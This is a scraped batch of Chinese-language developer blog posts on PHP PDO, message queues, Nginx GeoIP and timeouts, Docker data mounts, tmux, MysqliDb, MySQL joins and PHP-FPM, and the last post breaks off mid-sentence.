是什么？PDO（PHP Data Object） PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。 PDO 能做什么？PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。 在 PHP 使用 MySQL 数据库前，你需要先将它们连接。 PHP 5 及以上版本有两种方式连接 MySQL : MySQLi extension (“i” 意为 improved) PDO (PHP Data Objects) 关于是选择 Mysqli，还是 PDO？ MySQLi 和 PDO 有它们自己的优势：PDO 应用在 12 种不同数据库中， MySQLi 只针对 MySQL 数据库。 如果项目需要在多种数据库中切换，建议使用 PDO，因为只需要修改连接字符串和部分查询语句即可。 PDO 安装在 PHP5 系列版本中，PDO不是默认支持的，需要手工配置才可以使用。打开 php.ini 文件，开启扩展。 123&#x2F;&#x2F; php.iniextension&#x3D;php_pdo.dllextension&#x3D;php_pdo_mysql.dll 上述配置只打开了对 MySQL 的 PDO 支持，如果需要对别的数据库类型进行支持，可以分别打开对应的不同配置（去掉前面的分号）： 12345;extension&#x3D;php_pdo_oci.dll;extension&#x3D;php_pdo_oci8.dll;extension&#x3D;php_pdo_odbc.dll;extension&#x3D;php_pdo_pgsql.dll;extension&#x3D;php_pdo_sqlite.dll PDO 创建连接在使用 PDO 操作数据库之前，需要创建 PDO 连接对象。 1234new PDO(DSN, username, password);&lt;?php$dsn &#x3D; &quot;mysql:host&#x3D;localhost; dbname&#x3D;databasename&quot;;$stmt &#x3D; new PDO($dsn, &#39;user&#39;, &#39;pwd&#39;); 不同的数据库，其 DSN(Data Source Name) 构造方式是不一样的。常见数据库 DSN 语法如下： 12345678&#x2F;&#x2F;MySQL:$dsn &#x3D; mysql:host&#x3D;hostname;dbname&#x3D;db_name)&#x2F;&#x2F;SQLite:$dsn &#x3D; sqlite:db_name&#x2F;&#x2F;PGSQL$dsn pgsql:host&#x3D;hostname port&#x3D;port_id dbname&#x3D;db_name user&#x3D;username password&#x3D;password PDO Mysql 预处理语句预处理语句及绑定参数预处理语句用于执行多个相同的 SQL 语句，并且执行效率更高。 预处理语句的工作原理如下： 预处理：创建 SQL 语句模板并发送到数据库。预留的值使用参数 “?” 标记 。例如：INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?) 数据库解析，编译，对SQL语句模板执行查询优化，并存储结果不输出 执行：最后，将应用绑定的值传递给参数（”?” 标记），数据库执行语句。应用可以多次执行语句，如果参数的值不一样。 相比于直接执行SQL语句，预处理语句有两个主要优点： 预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行） 绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句 预处理语句针对SQL注入是非常有用的，因为 参数值发送后使用不同的协议，保证了数据的合法性。 PDO的直接查询和预处理分别是PDO 的 query类和 prepare 类。 PDO::prepare — 备要执行的SQL语句并返回一个 PDOStatement 对象 PDO::query — 执行 SQL 语句，返回PDOStatement对象,可以理解为结果集 前者其实就是执行 sql 语句，返回一个结果集对象（PDOStatement），然后操作 PDOStatement类，从结果集中取出相应的数据。 后者虽然也会返回一个 PDOSTatement 对象，但区别就在于两者的处理方式不同。query 是直接执行 sql 语句，而 prepare 是通过预处理的方式执行 sql 语句（更安全，更高效）。 错误处理PDO 默认开启的是错误码模式，如果发生了错误，只会简单地输出错误码，这对于调试或者测试来说，不是很友好，不利用快速定位异常所在。 所以PDO 还为我们提供了另外两种方式： PDO::ERRMODE_WARNING除设置错误码之外，PDO 还将发出一条传统的 E_WARNING 信息。如果只是想看看发生了什么问题且不中断应用程序的流程，那么此设置在调试/测试期间非常有用。 PDO::ERRMODE_EXCEPTION除设置错误码之外，PDO 还将抛出一个 PDOException 异常类并设置它的属性来反射错误码和错误信息。此设置在调试期间也非常有用，因为它会有效地放大脚本中产生错误的点，从而可以非常快速地指出代码中有问题的潜在区域（记住：如果异常导致脚本终止，则事务被自动回滚）。 创建 PDO 实例并设置错误模式： 1234567891011121314&lt;?php$dsn &#x3D; &#39;mysql:dbname&#x3D;testdb;host&#x3D;127.0.0.1&#39;;$user &#x3D; &#39;dbuser&#39;;$password &#x3D; &#39;dbpass&#39;;try &#123; $dbh &#x3D; new PDO($dsn, $user, $password); &#x2F;&#x2F; 开启ERRMODE_EXCEPTION 模式 $dbh-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);&#125; catch (PDOException $e) &#123; echo &#39;Connection failed: &#39; . $e-&gt;getMessage();&#125;?&gt; 参考链接： PHP PDO PHP PDO-&gt;query类 PHP Mysql 预处理语句 PHP 多种方式连接Mysql","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PDO","slug":"PDO","permalink":"https://www.0x2beace.com/tags/PDO/"}]},{"title":"消息队列快速上手","slug":"quick-start-message-queue","date":"2020-10-11T12:03:16.000Z","updated":"2020-10-13T23:54:23.637Z","comments":true,"path":"quick-start-message-queue/","link":"","permalink":"https://www.0x2beace.com/quick-start-message-queue/","excerpt":"业务场景描述： 订单创建成功之后，每一笔订单都需要进行统计及其他业务处理。 如何及时发现处理失败的订单，然后进行补单处理。 订单所产生佣金的处理。","text":"业务场景描述： 订单创建成功之后，每一笔订单都需要进行统计及其他业务处理。 如何及时发现处理失败的订单，然后进行补单处理。 订单所产生佣金的处理。 困境该应用因为一些历史原因使用 Mysql 的数据表作为消息队列。 整个系统中有多个生产者会向该数据表中插入记录，同时有一个脚本会作为消费者去数据库中查找记录并进行处理。 但是这样做是存在一些问题的： 长时间与数据库保持连接进行查询操作，消耗服务器资源。 在数据量较大或者延时较高的情况下，不能及时处理完，会影响其他业务。 所以更好的方式应该是使用消息队列来解决。 什么是消息队列？消息队列（Message Queue），是分布式系统中重要的组件，其通用的使用场景可以简单地描述为： 当不需要立即获得结果，但是并发量又需要进行控制的时候，差不多就是需要使用消息队列的时候。 常见应用场景其常见的应用场景有以下几个： 应用耦合：多应用间通过消息队列对同一消息进行处理，避免调用接口失败导致整个过程失败； 异步处理：多应用对消息队列中同一消息进行处理，应用间并发处理消息，相比串行处理，减少处理时间； 限流削峰：广泛应用于秒杀或抢购活动中，避免流量过大导致应用系统挂掉的情况； 消息驱动的系统：系统分为消息队列、消息生产者、消息消费者，生产者负责产生消息，消费者(可能有多个)负责对消息进行处理； 1. 异步处理场景描述：用户注册之后，需要邮箱或者短信通知，传统的做法有两种： 串行： 注册成功 发送邮件 发送短信 只有等以上三个任务全部完成之后，才会返回客户端。 并行： 注册成功 发送邮件并同时发送短信 虽然也是需要以上三个任务全部完成才会返回客户端，但并行与串行的区别就在于，通过使用多线程来缩短程序处理时间。 假设三个业务节点每个使用50毫秒钟，不考虑网络等其他开销，则串行方式的时间是150毫秒，并行的时间可能是100毫秒。 因为CPU在单位时间内处理的请求数是一定的，假设CPU1秒内吞吐量是100次。则串行方式1秒内CPU可处理的请求量是7次（1000/150）。并行方式处理的请求量是10次（1000/100）。 就该场景而言，如何突破传统方式带来的性能瓶颈？ 解决方案： 引入消息队列 将不是必须的业务逻辑，加入队列中，进行异步处理。 2. 应用解耦消息队列模式消息队列包括两种模式，点对点模式（point to point， queue）和发布/订阅模式（publish/subscribe，topic）。 点对点模式点对点模式包括以下三个角色： 消息队列 生产者 消费者 生产者将消息发送到队列中，消费者从队列中取出消息进行消费，消息被消费之后，消息不再被存储。 点对点模式的特点： 每个消息只有一个接收者（Consumer）(即一旦被消费，消息就不再在消息队列中)。 生产者和消费者之间没有依赖性，不会因为消费者是否在线，都会存在于队列中。 发布/订阅模式发布/订阅模式下包括三个角色： 频道 发布者 订阅者 发布者将消息发布在频道中，频道将消息传递给所有订阅者。 发布/订阅模式特点： 每个消息可以有多个订阅者 发布者和订阅者之间存在依赖关系，必须先订阅频道，发布者发布的消息才会被订阅者所接收。 因为发布的消息是无状态的，所以订阅者需要订阅频道且在线。 常用消息队列 RabbitMQ ActiveMQ RocketMQ Kafka Redis 参考链接 为什么会需要消息队列(MQ)？ PHP(Mysql/Redis)消息队列的介绍及应用场景案例 消息队列及常见消息队列介绍 PHP大量数据写入文档，如何异步处理？","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"MQ","slug":"MQ","permalink":"https://www.0x2beace.com/tags/MQ/"}]},{"title":"Nginx 如何根据 IP 获取地域信息","slug":"how-does-nginx-obtain-geographic-information-based-on-ip","date":"2020-10-08T09:29:34.000Z","updated":"2020-10-11T12:01:45.888Z","comments":true,"path":"how-does-nginx-obtain-geographic-information-based-on-ip/","link":"","permalink":"https://www.0x2beace.com/how-does-nginx-obtain-geographic-information-based-on-ip/","excerpt":"最近有一个需求：需要根据用户的IP 获取其国家，然后根据不同国家进行代理转发。","text":"最近有一个需求：需要根据用户的IP 获取其国家，然后根据不同国家进行代理转发。 想要完成这个需求，首先第一个解决的问题就是获取IP 地址所对应的地理位置： 这个需求通常是由 GeoIP 这个模块来完成的，Nginx 默认没有开启该模块。 GeoIP 是基于 maxmind 提供的数据文件进行分析的，所以还需要下载 maxmind 的数据源文件。 安装GeoIP 模块前面也提到了MaxMind GeoLite Legacy数据库目前已停产，应改用MaxMind GeoIP2或Geolite2数据库和NGINX Plus GeoIP2模块。 Centos： 1yum install nginx-plus-module-geoip2 Ubuntu： 1sudo apt-get install nginx-plus-module-geoip2 然后将 load_module 指令都放在nginx.conf 的配置文件的顶部： 123456load_module modules&#x2F;ngx_http_geoip2_module.so;load_module modules&#x2F;ngx_stream_geoip2_module.so;http &#123; ...&#125; 安装 GeoIP 数据源自从 2019年12月30日开始，就不能直接从MaxMind 上下载了，需要先注册一个账号，获取 license key，然后wget 时带上 key。具体可以查阅这篇文章。 这是一种安装方式，如果觉得麻烦，可以尝试下面这种方式。 安装依赖： 123sudo add-apt-repository ppa:maxmind&#x2F;ppasudo apt updatesudo apt install libgeoip1 libgeoip-dev geoip-bin 下载源码包，安装应用： 123456sudo wget https:&#x2F;&#x2F;github.com&#x2F;maxmind&#x2F;geoip-api-c&#x2F;releases&#x2F;download&#x2F;v1.6.12&#x2F;GeoIP-1.6.12.tar.gzsudo tar -zxvf GeoIP-1.6.12.tar.gzcd GeoIP-1.6.12 &amp;&amp; \\.&#x2F;configure &amp;&amp; \\make &amp;&amp; sudo make install 查找GeoIP.dat所在位置： 12sudo find &#x2F; -name GeoIP.dat&#x2F;usr&#x2F;share&#x2F;GeoIP&#x2F;GeoIP.dat 在配置文件中使用： 12345678910geoip_country &#x2F;etc&#x2F;nginx&#x2F;geoip&#x2F;GeoIP-1.6.12&#x2F;data&#x2F;GeoIP.dat;server &#123; ... location &#x2F;myip &#123; default_type text&#x2F;plain; return 200 &quot;$remote_addr $geoip_country_name $geoip_country_code $geoip_city&quot;; &#125;&#125; 通过以下变量综合获取地域信息： $remote_addr：IP地址 $geoip_country_name：国家 $geoip_country_code：对应编码 $geoip_city：城市名称 参考链接 nginx: [emerg] unknown directive “geoip_country” in /etc/nginx/nginx.conf:23 install GeoIP install GeoIP module","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"}]},{"title":"Docker 数据挂载","slug":"docker-data-mount","date":"2020-10-07T12:24:01.000Z","updated":"2020-10-07T12:24:40.708Z","comments":true,"path":"docker-data-mount/","link":"","permalink":"https://www.0x2beace.com/docker-data-mount/","excerpt":"","text":"数据挂载数据挂载在Docker 中还是挺重要的一部分，因为有多种方式，而不同的方式所对应的处理数据的逻辑也不一样。 Volumes：Docker 管理宿主机文件系统的一部分（/var/lib/docker/volumes）。 Bind Mounts：将宿主机上的任意位置的文件或目录挂载到容器中。 tmpfs：挂载存储在主机系统的内存中，而不会写入主机的文件系统。如果不系统将数据持久存储在任何位置，可以使用tmpfs，同时避免写入容器可写层提高性能。 这里主要介绍前两者，后者使用的并不多。注意第一种和第二种是存在区别的，前者是使用的数据卷进行挂载，而后者则是直接使用的宿主机上的文件或者目录挂载到容器中。 众所周知，将容器删除之后，容器内所有的改动将不复存在。 挂载数据卷通常是最常用且最好的方式，这种方式会将容器中的数据持久化在宿主机中，这样做的好处就是当容器被删除或者无法正常启动时，数据仍是完整的。 挂载数据卷有两种方式： 使用--mount 使用-v 前者是新版本的方式，后者是老版本的方式，其效果都是一样的。 Volumes创建一个数据卷： 1docker volume create &lt;volume name&gt; 列出数据卷列表： 1docker volume ls 列出数据卷的详情信息： 1docker volume inspect &lt;volume name&gt; 删除数据卷： 1docker volume rm &lt;volume name&gt; 用数据卷创建一个容器： 123456789# 新版本docker run -d -it \\--name&#x3D;nginx --mount src&#x3D;&lt;volume name&gt;,dst&#x3D;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\nginx# 老版本docker run -d -it \\--name&#x3D;nginx -v &lt;volume name&gt;:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\nginx 需要注意的是： 如果没有指定数据卷，则会自动创建 Bind Mounts使用bind mounts 创建一个容器： 12345678910111213# 新版本docker run -d -it \\--name nginx \\-p 8080:80 \\--mounts type&#x3D;bind,src&#x3D;&#x2F;var&#x2F;www,dst&#x3D;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\nginx# 老版本docker run -d -it \\--name nginx \\-p 8080:80 \\-v &#x2F;var&#x2F;www:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\nginx 需要注意的是： 如果源文件/目录没有存在，docker 不会自动创建，而会自动抛出一个错误。 如果挂载目标在容器中是非空目录，则该目录现有内容将被隐藏。","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"nginx 超时问题——upstream timed out (110: Connection timed out) while reading response header from upstream","slug":"nginx-timeout-problem-upstream-timed-out-110-Connection-timed-out-while-reading-response-header-from-upstream","date":"2020-10-05T12:28:45.000Z","updated":"2020-10-05T12:29:53.756Z","comments":true,"path":"nginx-timeout-problem-upstream-timed-out-110-Connection-timed-out-while-reading-response-header-from-upstream/","link":"","permalink":"https://www.0x2beace.com/nginx-timeout-problem-upstream-timed-out-110-Connection-timed-out-while-reading-response-header-from-upstream/","excerpt":"今天早上起来，发现后台登录不上，打开控制台发现几乎所有请求都超时了。","text":"今天早上起来，发现后台登录不上，打开控制台发现几乎所有请求都超时了。 打开nginx 的异常日志可以看到全是相同的异常： upstream timed out (110: Connection timed out) while reading response header from upstream 从这个异常日志可以分析出，由于nginx 代理去获取上游服务器的响应超时了，那么究竟是什么原因导致它会超时呢？ 通常会导致请求超时可能有以下几个原因： 接口比较复杂，响应时间慢，导致超时。 处理请求的进程异常。 代理服务器与上游服务器的网络问题。 因为请求一直都是那些请求，所以第一种可能性可以排除。另外子进程数量设置的是比较大，所以第二种应该也可以排除。 对于服务器的网络问题，如果条件允许，可以直接从根本上解决，另外也可以通过设置超时时间来延缓请求超时。 在server 中添加以下配置： 1234567891011large_client_header_buffers 4 16k;client_max_body_size 30m;client_body_buffer_size 128k;proxy_connect_timeout 240s;proxy_read_timeout 240s;proxy_send_timeout 240s;proxy_buffer_size 64k;proxy_buffers 4 32k;proxy_busy_buffers_size 64k;proxy_temp_file_write_size 64k; 然后重启Nginx。 参考链接 nginx 设置超时时间-Nginx 官网","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"}]},{"title":"Tmux 快速上手","slug":"tmux-quick-start","date":"2020-10-04T12:39:38.000Z","updated":"2020-10-04T12:41:19.876Z","comments":true,"path":"tmux-quick-start/","link":"","permalink":"https://www.0x2beace.com/tmux-quick-start/","excerpt":"","text":"本来之前就知道有 tmux 这样一个窗口分隔工具，只不过一直使用着iTerm2，本身就自带有标签页功能，所以就一直没去学习这个工具。 这段时间需要经常访问Linux服务器，所以在服务器上安装了这个工具。 安装Mac： 1brew install tmux Linux: 1apt-get install tmux 一般情况下 tmux 中所有的快捷键都需要和前缀快捷键 ⌃b 来组合使用（注：⌃ 为 Mac 的 control 键），以下是常用的窗格（pane）快捷键列表。 会话第一次使用tmux 可能会被Session、窗口、窗格 这些陌生的概念，弄得摸不着头脑。 这里总结成一句话就是：一个完整的会话（Session）是由数个窗口组成，而一个窗口又可以分成若各个窗格。 使用tmux 命令会默认新建一个tmux 会话： 12&#x2F;&#x2F; 默认新建一个Session 名称为 0 的窗口。tmux 常用Session操作： $ 重命名当前会话 s 选择会话列表 d 退出当前会话（不是删除），运行后将会退出 tmux 进程，返回至 shell 主进程。 窗口窗口的概念不同于窗格，窗口互不影响，窗格相互分隔。 常用窗口操作： c 新建窗口，此时当前窗口会切换至新窗口，不影响原有窗口的状态 p 切换至上一窗口 n 切换至下一窗口 w 窗口列表选择，注意 macOS 下使用 ⌃p 和 ⌃n 进行上下选择 &amp; 关闭当前窗口 , 重命名窗口，可以使用中文，重命名后能在 tmux 状态栏更快速的识别窗口 id 0 切换至 0 号窗口，使用其他数字 id 切换至对应窗口 f 根据窗口名搜索选择窗口，可模糊匹配 窗格窗格是在窗口下的概念，若干个窗格组成一个窗口。 常用窗格操作： % 左右平分出两个窗格 “ 上下平分出两个窗格 x 关闭当前窗格 { 当前窗格前移 } 当前窗格后移 ; 选择上次使用的窗格 o 选择下一个窗格，也可以使用上下左右方向键来选择 space 切换窗格布局，tmux 内置了五种窗格布局，也可以通过 ⌥1 至 ⌥5来切换 z 最大化当前窗格，再次执行可恢复原来大小 q 显示所有窗格的序号，在序号出现期间按下对应的数字，即可跳转至对应的窗格 其他命令上面那些命令都是配合⌃ + b快捷键使用的，下面的这些命令都是在Shell进程中直接执行的。 新建名称为 foo 的会话 1tmux new -s foo 列出所有 tmux 会话 1tmux ls 恢复上一次会话 1tmux a 恢复名为 foo 的会话 1tmux a -t foo 删除名为 foo 的会话 1tmux kill -session -t foo 删除所有会话 1tmux kill -server tmux or iterm2tmux 和iTerm2 都有窗口管理方面的功能，只是前者相比后者的优势在于： iTerm2 的窗格切换快捷键（⌘⌥→）容易与其他软件全局快捷键冲突（例如 Spectacle 的窗口分割快捷键），tmux 由于存在前缀快捷键，所以不存在快捷键冲突问题； tmux 可以在终端软件重启后通过命令行恢复上次的 session ，而终端软件则不行； tmux 简洁优雅、订制性强，学会之后也能在 Linux 上使用，有助于逼格提升。 参考链接 Tmux 快捷键&amp;速查表&amp;简明教程 十分钟学会 Tmux [Tmux 快捷键和备忘录](","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Mac","slug":"Linux/Mac","permalink":"https://www.0x2beace.com/categories/Linux/Mac/"}],"tags":[{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Terminal","slug":"Terminal","permalink":"https://www.0x2beace.com/tags/Terminal/"}]},{"title":"MysqliDb 快速上手","slug":"mysqlidb-is-quick-to-get-started","date":"2020-10-02T07:26:03.000Z","updated":"2020-10-02T07:27:10.385Z","comments":true,"path":"mysqlidb-is-quick-to-get-started/","link":"","permalink":"https://www.0x2beace.com/mysqlidb-is-quick-to-get-started/","excerpt":"","text":"MysqliDb 是基于 mysqli 扩展出来的一个类库，其中封装了很多常用的Mysql 基础操作，相比原生的方式，后者使用起来更加方便。 具有如下特点： 支持链式操作 支持Mysql 函数的使用 … 安装使用composer 安装 1composer require thingengineer&#x2F;mysqli-database-class:dev-master 因为MysqliDb没有命名空间，所以我们想要使用的话，不能自动加载，只能先引入。 1require &quot;MysqliDb.php&quot;; 初始化初始化连接有几种方式： 1. MysqliDb 字符串1$db &#x3D; new MysqliDb (&#39;host&#39;, &#39;username&#39;, &#39;password&#39;, &#39;databaseName&#39;); 2. MysqliDb 对象123456789$db &#x3D; new MysqliDb ([ &#39;host&#39; &#x3D;&gt; &#39;host&#39;, &#39;username&#39; &#x3D;&gt; &#39;username&#39;, &#39;password&#39; &#x3D;&gt; &#39;password&#39;, &#39;db&#39;&#x3D;&gt; &#39;databaseName&#39;, &#39;port&#39; &#x3D;&gt; 3306, &#39;prefix&#39; &#x3D;&gt; &#39;my_&#39;, &#39;charset&#39; &#x3D;&gt; &#39;utf8&#39;]); 3. mysqli 对象12$mysqli &#x3D; new mysqli (&#39;host&#39;, &#39;username&#39;, &#39;password&#39;, &#39;databaseName&#39;);$db &#x3D; new MysqliDb ($mysqli); 新增向user 表中插入一条记录： 123456$data &#x3D; [ &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, &quot;age&quot; &#x3D;&gt; 21, &quot;gender&quot; &#x3D;&gt; &quot;man&quot;];$success &#x3D; $db-&gt;insert(&quot;user&quot;, $data); 返回值类型：bool 修改修改user 表中的一条记录 12345$data &#x3D; [ &quot;age&quot; &#x3D;&gt; 22,];$success &#x3D; $db-&gt;where([&quot;name&quot; &#x3D;&gt; &quot;boo&quot;]) -&gt;update(&quot;user&quot;, $data); 返回值类型：bool 查询获取user 表所有数据：1$result &#x3D; $db-&gt;get(&quot;user&quot;, null, &quot;*&quot;); 返回值：多维数组 获取user 表单条数据：1$result &#x3D; $db-&gt;getOne(&quot;user&quot;, &quot;*&quot;); 返回值：关联数组 获取user 表单个字段的值：12$result &#x3D; $db-&gt;where(&quot;name&quot;, &quot;boo&quot;) -&gt;getValue(&quot;user&quot;, &quot;*&quot;); 返回值：string 获取查询条数：1$result &#x3D; $db-&gt;getValue(&quot;user&quot;, &quot;count(*)&quot;); 删除删除user 表中一条记录 12$success &#x3D; $db-&gt;where(&quot;user_id&quot;, &quot;boo&quot;) -&gt;delete(&quot;user); 运行原生SQL1$result &#x3D; $db-&gt;rawQuery(&quot;select * from user where name &#x3D; \\&quot;boo\\&quot;&quot;) 总体来说，MysqliDb 真的挺好用的，基本上可以满足所有日常需求。这里只是列举了最基本的CURD，更多操作可以参考官网手册。 参考链接joshcam/mysqli-database-class","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Mysqli","slug":"Mysqli","permalink":"https://www.0x2beace.com/tags/Mysqli/"}]},{"title":"PHPStrom 高级技巧整理","slug":"phpstorm-advanced-skills-finishing","date":"2020-10-01T02:39:34.000Z","updated":"2020-10-01T02:40:44.980Z","comments":true,"path":"phpstorm-advanced-skills-finishing/","link":"","permalink":"https://www.0x2beace.com/phpstorm-advanced-skills-finishing/","excerpt":"","text":"PHPStrom 是我日常使用频率很高的 IDE。 基础的使用这里就不过多介绍了，这里主要是用来整理一些比较高级的用法。 调试技巧调试是日常开发中，不可缺少的一部分。 路径映射通常都是用来调试本地代码，可如果需要调试虚拟机或者其他应用中时，那该怎么做呢？ 打开偏好设置或者设置，找到一个已经配置好的服务，勾选映射。 然后找到该服务的入口配置文件，后面的文件路径填绝对路径。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHPStorm","slug":"PHPStorm","permalink":"https://www.0x2beace.com/tags/PHPStorm/"}]},{"title":"递归算法","slug":"recursive-algorithm","date":"2020-09-30T12:21:12.000Z","updated":"2020-10-01T02:39:46.124Z","comments":true,"path":"recursive-algorithm/","link":"","permalink":"https://www.0x2beace.com/recursive-algorithm/","excerpt":"最近在业务上遇到一个需求，需要根据已知的一个数一层一层查找除所有对应下级用户，然后将结果放在数组中。","text":"最近在业务上遇到一个需求，需要根据已知的一个数一层一层查找除所有对应下级用户，然后将结果放在数组中。 最后返回的结果大概是这样： 1234567891011121314151617181920$result &#x3D; [ 0 &#x3D;&gt; [ &quot;user_id&quot; &#x3D;&gt; &quot;php&quot;, &quot;sub_id&quot; &#x3D;&gt; [ 0 &#x3D;&gt; [ &quot;user_id&quot; &#x3D;&gt; &quot;python&quot;, &quot;sub_id&quot; &#x3D;&gt; [] ], 1 &#x3D;&gt; [ &quot;user_id&quot; &#x3D;&gt; &quot;go&quot;, &quot;sup_id&quot; &#x3D;&gt; [ 0 &#x3D;&gt; [ &quot;user_id&quot; &#x3D;&gt; &quot;ruby&quot;, &quot;sub_id&quot; &#x3D;&gt; [] ] ] ], ] ]]; 这个问题的难点在于： 我并不知道有多少个下级 索引是未知的。 对于这个问题，首先第一个想到是使用递归算法来解决。 使用递归算法是没错，不过思路还是有些问题，我试图通过正向查找，然后将数据 push 至结果集。所以这里存在一个问题：我需要知道数组具体的索引是多少。 在第一个思路无解之后，果断放弃了。要解决这个问题，我得正向查找，逆向存值。 也就是把递归返回的结果压入到当前用户的数组中，然后返回当前用户，从最后一个用户往前处理。 最后实现的代码如下： 12345678910111213function get_user_tree($user_id)&#123; $result &#x3D; []; &#x2F;&#x2F; todo（数据查询） &#x2F;&#x2F; 遍历数据 foreach ($data as $item)&#123; $user &#x3D; get_user_tree($item[&#39;user_id&#39;]); $item[&#39;sub_id&#39;] &#x3D; $user; array_push($result, $item); &#125; return $result;&#125; 不得不说递归算法真的非常优雅，仅仅不到十来行代码就把这个复杂的问题给解决了。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"算法","slug":"算法","permalink":"https://www.0x2beace.com/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"Mysql 多表联查","slug":"mysql-multi-table-joint-check","date":"2020-09-24T10:56:22.000Z","updated":"2020-09-24T10:57:00.944Z","comments":true,"path":"mysql-multi-table-joint-check/","link":"","permalink":"https://www.0x2beace.com/mysql-multi-table-joint-check/","excerpt":"Mysql 的两张表联表查询可能大家都知道怎么查，但如果是三张表或者是更多张表呢？","text":"Mysql 的两张表联表查询可能大家都知道怎么查，但如果是三张表或者是更多张表呢？ 其实不管是两张表还是三张表还是N 张表都是一样的。 多表联查1234567891011# 语法一：select t1.*, t2.*, t3.* from table1 t1, table2 t2, table3 t3where t1.id &#x3D; t2.id and t1.id &#x3D; t3.id;# 语法二：select t1.*, t2.*, t3.* from table t1 inner join table2 t2 on t1.id &#x3D; t2.id inner join table3 t3 on t1.id &#x3D; t3.id; 有几点需要注意： 上面的id 并不一定非要使用id，可以是任何有关联性的其他字段 如果表名是关键字，那么需要查询时在这个关键字上加反引号，如：`order` inner join 可以根据实际情况可以换成left join、right join","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"PHP-FPM 与 Nginx 是什么关系？","slug":"what-is-the-relationship-between-php-fpm-and-nginx","date":"2020-09-23T14:35:17.000Z","updated":"2020-09-23T14:41:58.011Z","comments":true,"path":"what-is-the-relationship-between-php-fpm-and-nginx/","link":"","permalink":"https://www.0x2beace.com/what-is-the-relationship-between-php-fpm-and-nginx/","excerpt":"最近部署了几次项目，经常遇到这样一个错误：Nginx 502 bad gateway，查看 Nginx 错误日志之后，发现这样一段话：Primary script unknown，找了好久的答案，总结出以下几个原因：","text":"最近部署了几次项目，经常遇到这样一个错误：Nginx 502 bad gateway，查看 Nginx 错误日志之后，发现这样一段话：Primary script unknown，找了好久的答案，总结出以下几个原因： 未启动 Nginx 未启动 php-fpm Nginx 配置异常 文件夹权限不足 其中未启动 php-fpm 是出现最多的错误，再聊 php-fpm 之前，我们先来学习几个 相关概念。 什么是 cgiCgi 是一个协议，它约定了 web server 和应用程序（如：PHP、Python等）之间的信息交换的标准格式。 静态文件当一个客户端试图访问index.html这个文件时，那么 web server 就回去文件系统中找到这个文件，最后将结果返回给客户端。 非静态文件当一个客户端试图访问index.php这个文件时，web server 收到请求之后，根据配置文件知道了自己处理不了，接着转发给第三方的应用程序（PHP解析器、Python解析器等），web server 知道该传哪些数据吗？它不知道，所以 Cgi 就是约定要传哪些数据，以什么样的格式传递给第三方的应用程序的协议。 应用程序独立处理完该脚本，然后再将结果返回给产生响应的 web server，最后转发响应至客户端。 当 web server 收到 index.php 这个请求之后，会启动对应的 cgi 程序（PHP解析器，Python解析器），接下来解析器会解析 php.ini 配置文件，初始化执行环境，然后处理请求，再以 cgi 规定的格式返回处理后的结果，退出进程。web server 将转发响应至客户端。 这种协议看上去简单有效，但它也存在一些明显不足： 每一个请求产生唯一一个进程，从一个请求到另一个请求，内容和其他的信息全部丢失。 开启一个进程会消耗系统的资源，大而重的并发请求（每产生一个进程）数量很快会使服务器一团糟。 什么是 fastcgi知道了 cgi 是协议之后，那 fastcgi 又是什么呢？ 知道了 cgi 服务器性能低下的原因是因为每产生一个请求，都会做同样的事情：解析器解析配置文件，初始化执行环境，启动一个新的进程。 fastcgi 则是在 cgi 的基础上做了重大的改进，从而达到相同的目的，原理如下： fgstcgi 使用了能够处理多个请求的持续进程，而不是针对每个请求都产生新的进程。 fastcgi 是一个基于套接字的协议，因此它能够适用于任务平台（web server）及任何编程语言。 fastcgi 的性能之所以高于 cgi，是因为 fastcgi 可以对进程进行管理，而这是 cgi 所做不到的，但它的本质仍然是 协议。 什么是 php-fpm默认情况下，PHP 是支持 cgi 和 fastcgi 